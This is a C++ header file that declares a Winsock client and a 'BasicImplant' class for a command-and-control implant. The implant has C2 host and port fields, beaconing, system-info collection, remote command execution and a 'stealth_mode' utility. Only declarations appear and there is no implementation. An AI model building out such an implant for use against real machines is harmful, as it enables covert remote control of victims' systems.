#ifndef CLIENT_H
#define CLIENT_H

#include <iostream>
#include <string>
#include <winsock2.h>

#include <ws2tcpip.h>


#include <iostream>
//#include <WS2tcpip.h>
#include <string>
//#include <thread>
//#include <chrono>
//#include <windows.h>
//#include <lmcons.h>

#pragma comment(lib, "ws2_32.lib")



// TODO: put this all in a namespace called Networking or something?

// TODO: turn this Client class into a parent class that different types of 
// clients can inherit from... like TCPClient, UDPClient, HTTPSClient, etc
class Client
{
public:
    Client();
    ~Client();
    void run(const std::string& host, const std::string& port); // call socket, connect, and etc
    bool createSocket(int af = AF_INET, int type = SOCK_STREAM, int protocol = IPPROTO_TCP);
    //void createConnection(const char* host, u_short port);
    bool createConnection(const std::string& host, const std::string& port);
    //void receiveData();
    std::string receiveData();
    void sendData(const std::string& data);
    void parse();
private:
    const char* server_ip_; // TODO: should only be recorded to help with reconnection?
    u_short port_; // TODO: should only be recorded to help with reconnection?


    char* implant_id;
    unsigned beaconInterval;
    unsigned timeout_;
    bool running;
 
    // TODO: determine proper prealloc size
    // TODO: make another buffer for handling bigger data xfers like for files?
    static constexpr size_t RECV_BUFFER_SIZE = 4096;  // Easy to change
    char recvBuffer_[RECV_BUFFER_SIZE];

    SOCKET socket_;
    bool connected_;
    bool initalized_;


};

class BasicImplant {
private:
    std::string c2_host;
    int c2_port;
    std::string implant_id;
    int checkin_interval;
    bool running;
    
    // Private helper methods
    std::string get_username();
    std::string get_architecture(SYSTEM_INFO& sys_info);
    std::string get_os_version(OSVERSIONINFOA& os_info);
    void parse_response(const std::string& response);
    void execute_queued_command(const std::string& command);
    
public:
    // Constructor/Destructor
    BasicImplant(const std::string& host = "127.0.0.1", int port = 4444);
    ~BasicImplant();
    
    // Core functionality
    std::string get_system_info();
    std::string execute_command(const std::string& command);
    std::string send_to_c2(const std::string& message);
    void process_c2_commands(const std::string& response);
    void beacon();
    void stop();
    
    // Getters
    std::string get_implant_id() const { return implant_id; }
    std::string get_c2_host() const { return c2_host; }
    int get_c2_port() const { return c2_port; }
    int get_checkin_interval() const { return checkin_interval; }
    
    // Setters
    void set_checkin_interval(int interval) { checkin_interval = interval; }
};

// Utility functions
namespace ImplantUtils {
    void stealth_mode();
    std::string generate_implant_id();
    std::string format_message(const std::string& implant_id, 
                              const std::string& command, 
                              const std::string& data = "");
    std::string url_encode(const std::string& value);
    void sleep_seconds(int seconds);
}

#endif // CLIENT_H